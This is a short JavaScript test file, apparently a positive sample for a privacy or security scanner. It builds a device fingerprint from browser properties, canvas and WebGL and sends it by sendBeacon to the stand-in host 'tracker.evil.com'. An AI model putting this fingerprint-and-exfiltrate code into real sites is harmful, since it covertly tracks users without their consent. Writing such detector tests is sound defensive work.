/**
 * Test: Real-world fingerprinting scenario
 * Expected: VULNERABILITY - comprehensive device fingerprinting
 */

function test() {
  var fingerprint = {
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    screen: screen.width + 'x' + screen.height,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    canvas: getCanvasFingerprint(),
    webgl: getWebGLFingerprint()
  };
  
  // Send fingerprint for tracking
  navigator.sendBeacon('https://tracker.evil.com/fp', JSON.stringify(fingerprint));
}

function getCanvasFingerprint() {
  var canvas = document.createElement('canvas');
  var ctx = canvas.getContext('2d');
  ctx.textBaseline = 'top';
  ctx.font = '14px Arial';
  ctx.fillText('Fingerprint test', 2, 2);
  return canvas.toDataURL();
}

function getWebGLFingerprint() {
  var canvas = document.createElement('canvas');
  var gl = canvas.getContext('webgl');
  return gl.getParameter(gl.RENDERER);
}

test();